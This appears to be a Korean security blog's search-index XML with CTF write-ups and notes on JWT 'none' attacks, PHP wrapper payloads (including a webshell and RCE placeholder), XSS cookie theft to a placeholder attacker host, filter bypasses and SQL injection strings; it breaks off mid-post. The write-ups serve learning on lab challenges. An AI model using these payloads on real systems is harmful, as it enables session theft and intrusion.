<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>(ko) Docker Language Setting</title>
      <link href="2020/04/22/dockerset-200422/"/>
      <url>2020/04/22/dockerset-200422/</url>
      
        <content type="html"><![CDATA[<h3 id="1-설정-변경-사항"><a href="#1-설정-변경-사항" class="headerlink" title="1. 설정 변경 사항"></a>1. 설정 변경 사항</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install locales</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANGUAGE=ko_KR.UTF-8</span><br><span class="line"><span class="built_in">export</span> LANG=ko_KR.UTF-8</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">locale-gen ko_KR ko_KR.UTF-8</span><br><span class="line">update-locale LANG=ko_KR.UTF-8</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다.</p><ul><li>Dockerfile</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RUN apt-get install language-pack-ko -y</span><br><span class="line">RUN apt-get install fonts-nanum -y</span><br><span class="line">RUN apt-get install fonts-nanum-coding -y</span><br><span class="line"></span><br><span class="line">RUN locale-gen ko_KR.UTF-8</span><br><span class="line">ENV LANG ko_KR.UTF-8</span><br><span class="line">ENV LANGUAGE ko_KR.UTF-8</span><br><span class="line">ENV LC_ALL ko_KR.UTF-8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dockerfile, Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT None Type Injection</title>
      <link href="2020/04/22/jwtinjection-200422/"/>
      <url>2020/04/22/jwtinjection-200422/</url>
      
        <content type="html"><![CDATA[<h3 id="1-JWT-JSON-WEB-TOKEN"><a href="#1-JWT-JSON-WEB-TOKEN" class="headerlink" title="1. JWT(JSON WEB TOKEN)"></a>1. JWT(JSON WEB TOKEN)</h3><p>JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다.</p><p>JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다.</p><hr><h3 id="2-JWT-TOKEN"><a href="#2-JWT-TOKEN" class="headerlink" title="2. JWT TOKEN"></a>2. JWT TOKEN</h3><p>JWT는 아래와 같은 형태를 가지고 있고,</p><p>Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다.</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8</p><p>헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;name&quot;: &quot;jhyeon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데,</p><p>이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다.</p><hr><h3 id="3-How-to-JWT-None-Type-Attack"><a href="#3-How-to-JWT-None-Type-Attack" class="headerlink" title="3. How to JWT None Type Attack?"></a>3. How to JWT None Type Attack?</h3><p>JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데,</p><p>이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, 잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다.</p><p>따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다.</p><ul><li>참고 : <a href="https://jwt.io/">https://jwt.io</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php wrapper</title>
      <link href="2020/04/22/phpwrapper-200422/"/>
      <url>2020/04/22/phpwrapper-200422/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">expect://expect://ls</span><br><span class="line">php:filterphp://filter/convert.base64-encode/resource=index.php</span><br><span class="line">zip://zip://filename.zip<span class="comment">#webshell.php</span></span><br><span class="line">data://data://text/plain;base64,&#123;RCE CODE HERE&#125;</span><br><span class="line">php://input<span class="built_in">echo</span> base64_encode(file_get_contents(<span class="string">&quot;filename&quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mprotect Exploitation</title>
      <link href="2020/04/22/pwn-mprotect-200422/"/>
      <url>2020/04/22/pwn-mprotect-200422/</url>
      
        <content type="html"><![CDATA[<h3 id="1-참고-링크-Notion"><a href="#1-참고-링크-Notion" class="headerlink" title="1. 참고 링크(Notion)"></a>1. 참고 링크(Notion)</h3><ul><li>Notion : <a href="https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301">https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn, Mprotect, Shellcode, Exploitation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angstorm ctf 2020 Write up</title>
      <link href="2020/04/10/angstormctf-200410/"/>
      <url>2020/04/10/angstormctf-200410/</url>
      
        <content type="html"><![CDATA[<h3 id="1-WEB-The-Magic-Word"><a href="#1-WEB-The-Magic-Word" class="headerlink" title="1. [WEB - The Magic Word]"></a>1. [WEB - The Magic Word]</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">&quot;magic&quot;</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (magic.innerText == <span class="string">&quot;please give flag&quot;</span>) &#123;</span><br><span class="line">        fetch(<span class="string">&quot;/flag?msg=&quot;</span> + <span class="built_in">encodeURIComponent</span>(msg.innerText))</span><br><span class="line">        .then(<span class="function"><span class="params">res</span> =&gt;</span> res.text())</span><br><span class="line">        .then(<span class="function"><span class="params">txt</span> =&gt;</span> magic.innerText = txt.split<span class="string">``</span>.map(<span class="function"><span class="params">v</span> =&gt;</span> <span class="built_in">String</span>.fromCharCode(v.charCodeAt(<span class="number">0</span>) ^ <span class="number">0xf</span>)).join<span class="string">``</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>magic 텍스트의 값을 please give flag 으로 바꿔주면 된다.</p><hr><h3 id="2-WEB-Xmas-Still-Stands"><a href="#2-WEB-Xmas-Still-Stands" class="headerlink" title="2. [WEB - Xmas Still Stands]"></a>2. [WEB - Xmas Still Stands]</h3><p>문제 내 post 기능에서 xss 취약점이 발생한다.</p><p>글을 써놓고 report 기능을 통해 게시글 번호를 전송해주면 봇이 내 글에 방문하기 때문에</p><p>리다이렉션으로 돌려놓고 포트 열고 대기하면 쿠키값이 날아오는데 날아오는 쿠키값으로</p><p>페이지 내 쿠키를 다시 세팅해주고 /admin 으로 접속하면 된다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">&#x27;https://IP:9999/?cookie=&#x27;</span>+<span class="attr">document.cookie</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1<br>-&gt; super_secret_admin_cookie=hello_yes_i_am_admin</p><hr><h3 id="3-WEB-Consolation"><a href="#3-WEB-Consolation" class="headerlink" title="3. [WEB - Consolation]"></a>3. [WEB - Consolation]</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;nofret()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:150px; width:150px;&quot;</span>&gt;</span>pay me some money<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>먼저 이 버튼을 누르면 nofret() 라는 함수를 호출 시키는데 이 함수를 따라가면 다음과 같다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nofret</span>(<span class="params"></span>)</span>&#123;<span class="built_in">document</span>[_0x4229(<span class="string">&#x27;0x95&#x27;</span>,<span class="string">&#x27;kY1#&#x27;</span>)](_0x4229(<span class="string">&#x27;0x9&#x27;</span>,<span class="string">&#x27;kY1#&#x27;</span>))[_0x4229(<span class="string">&#x27;0x32&#x27;</span>,<span class="string">&#x27;yblQ&#x27;</span>)]=<span class="built_in">parseInt</span>(<span class="built_in">document</span>[_0x4229(<span class="string">&#x27;0x5e&#x27;</span>,<span class="string">&#x27;xtR2&#x27;</span>)](_0x4229(<span class="string">&#x27;0x2d&#x27;</span>,<span class="string">&#x27;uCq1&#x27;</span>))[<span class="string">&#x27;innerHTML&#x27;</span>])+<span class="number">0x19</span>;<span class="built_in">console</span>[_0x4229(<span class="string">&#x27;0x14&#x27;</span>,<span class="string">&#x27;70CK&#x27;</span>)](_0x4229(<span class="string">&#x27;0x38&#x27;</span>,<span class="string">&#x27;rwU*&#x27;</span>));<span class="built_in">console</span>[<span class="string">&#x27;clear&#x27;</span>]();&#125;</span><br></pre></td></tr></table></figure><p>[_0x4229(‘0x95’,’kY1#’)] 이 값을 chrome console 에서 실행시키면 어떤 값인지 알 수 있다. (getelementbyid)</p><p>순서대로 콘솔에 실행시켜보면 결과적으로, 0x4229(‘0x38’,’rwU*’) 이 값이 FLAG 를 가지고 있고,</p><p>콘솔에서 실행시키면 플래그를 얻을 수 있다.</p><hr><h3 id="4-WEB-Git-Good"><a href="#4-WEB-Git-Good" class="headerlink" title="4. [WEB - Git Good]"></a>4. [WEB - Git Good]</h3><p>아무것도 없는 Hello world 출력만 된 페이지이다,</p><p>문제의 이름 답게 /.git/ 을 통해 repository 저장소를 다운로드 할 수 있다.</p><p>git clone <a href="https://gitgood.2020.chall.actf.co/.git/">https://gitgood.2020.chall.actf.co/.git/</a></p><p>해당 저장소를 다운받아서 보면, thisistheflag.txt 라는 파일이 있는데 아무것도 없다,</p><p>그래서 커밋된 정보를 확인하기 위해 git show 를 해보면, 플래그가 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--- a&#x2F;thisistheflag.txt</span><br><span class="line">+++ b&#x2F;thisistheflag.txt</span><br><span class="line">@@ -1,3 +1 @@</span><br><span class="line">-actf&#123;b3_car3ful_wh4t_y0u_s3rve_wi7h&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="5-WEB-Secret-Agents"><a href="#5-WEB-Secret-Agents" class="headerlink" title="5. [WEB - Secret Agents]"></a>5. [WEB - Secret Agents]</h3><p>처음엔 고민좀 해보다가 user-agent injection 을 통해서 문제를 풀 수 있었다.</p><p>user-agent 값에 ‘ or ‘1’ = ‘1# 과 같이 injection 을 하나씩 해주고 사이트에 들어가보면 오류 메세지가 각각 다르게 반환되는 것을 볼 수 있다.</p><p>결과적으로 ‘ or ‘1’ = ‘1’ limit 2,1# 를 user-agent 값에 주입 하면 플래그가 있는 페이지를 볼 수 있다.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts 2020 Write up</title>
      <link href="2020/04/10/zer0ptsctf-200410/"/>
      <url>2020/04/10/zer0ptsctf-200410/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-can-you-guess-it-338-pt"><a href="#1-web-can-you-guess-it-338-pt" class="headerlink" title="1. [web] can you guess it?(338 pt)"></a>1. [web] can you guess it?(338 pt)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데,</p><p>정규식 표현으로 입력값 필터링을 하고 있다.</p><p>그런데 php 에서 basename 함수는 문자 \x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다.</p><p><code> index.php/config.php/%80?source </code></p><hr><h3 id="2-web-music-blog-653-pt"><a href="#2-web-music-blog-653-pt" class="headerlink" title="2. [web] music blog(653 pt)"></a>2. [web] music blog(653 pt)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;zer0pts&#123;&lt;censored&gt;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = async (url) =&gt; &#123;</span><br><span class="line">    console.log(`[+] Query! ($&#123;url&#125;)`);</span><br><span class="line">    <span class="keyword">const</span> page = await browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        await page.setUserAgent(flag);</span><br><span class="line">        await page.<span class="keyword">goto</span>(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        await page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    await page.close();</span><br><span class="line">    console.log(`[+] Done! ($&#123;url&#125;)`)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>문제에 보면 게시글을 올릴 수 있는 기능이 있다.</p><p>그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다.</p><p>그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">      &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">      &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">      &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다.</p><p>로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때</p><p>리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 입력값 필터링이 걸려 있다.</p><p>그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면</p><p>audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다.</p><p>즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio href=&#x27;myip.kr:12345&#x27; id=&#x27;like&#x27;&gt;like</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zixem challenge Write up</title>
      <link href="2020/04/10/zixemchall-200410/"/>
      <url>2020/04/10/zixemchall-200410/</url>
      
        <content type="html"><![CDATA[<p>Site : <a href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p><hr><h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,version(),<span class="number">3</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showprofile<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,version(),<span class="number">4</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span>unionon<span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,version(),<span class="number">4</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ebookid<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,version(),<span class="number">5</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 